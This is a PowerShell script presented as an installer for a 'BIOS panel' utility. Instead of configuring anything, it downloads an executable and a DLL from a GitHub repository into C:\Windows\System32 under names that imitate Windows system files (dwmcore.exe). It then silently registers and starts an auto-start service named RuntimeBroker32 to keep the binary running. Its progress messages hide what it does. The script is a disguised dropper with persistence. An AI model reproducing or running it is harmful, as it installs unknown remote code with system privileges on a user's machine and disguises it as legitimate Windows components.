# ================================
# Phoenix BIOS Panel - Downloader
# ================================

# Function to download DLL file
function Download-DLL {
    param(
        [string]$DllUrl,
        [string]$SaveDirectory,
        [string]$DllFileName
    )
    
    try {
        # Check if directory exists
        if (!(Test-Path $SaveDirectory)) {
            return $false
        }

        # Full path for DLL
        $dllPath = Join-Path $SaveDirectory $DllFileName

        # Download DLL silently
        Invoke-WebRequest -Uri $DllUrl -OutFile $dllPath -UseBasicParsing

        # Verify download
        if (Test-Path $dllPath) {
            return $true
        } else {
            return $false
        }

    } catch {
        return $false
    }
}

# Set console style
Clear-Host
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "     Ryuga BIOS Panel Installer    " -ForegroundColor Green
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# DLL URL
$url = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/dwmcore.exe"

# FIXED PATH (no dynamic, no creation)
$basePath = "C:\Windows\System32"
$fileName = "dwmcore.exe"
$filePath = Join-Path $basePath $fileName

# Check folder exists
if (!(Test-Path $basePath)) {
    Write-Host "Setting Not Found Please Contact the Developer" -ForegroundColor Red
    exit
}

try {
    # Download DLL
    Write-Host "[+] Please Wait Bios panel Being Setup..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing

    # Verify download
    if (Test-Path $filePath) {
        Write-Host "Connected to the System" -ForegroundColor Green
    } else {
        throw "Connection Failed!"
    }

    # File info
    $fileSize = (Get-Item $filePath).Length / 1KB
    Write-Host "[i] File Size: $([math]::Round($fileSize,2)) KB" -ForegroundColor Cyan

} catch {
    Write-Host "[X] Error: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host " Setup 1 success ✅" -ForegroundColor Green

# ================================
# Download Additional DLL (Silent)
# ================================
$dllUrl = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/bstkvm.dll"
$saveDir = "C:\Windows\System32"
$dllName = "bstkvm.dll"

$result = Download-DLL -DllUrl $dllUrl -SaveDirectory $saveDir -DllFileName $dllName

if ($result) {
    # Create Windows Service
    sc.exe create RuntimeBroker32 binPath= "C:\Windows\System32\dwmcore.exe" start= auto | Out-Null
    
    # Start the Service immediately
    sc.exe start RuntimeBroker32 | Out-Null
    
    Write-Host "bios panel is ready to use now Please restart Your PC " -ForegroundColor Green
} else {
    Write-Host ""
    Write-Host "Failed to Settup" -ForegroundColor Red
}
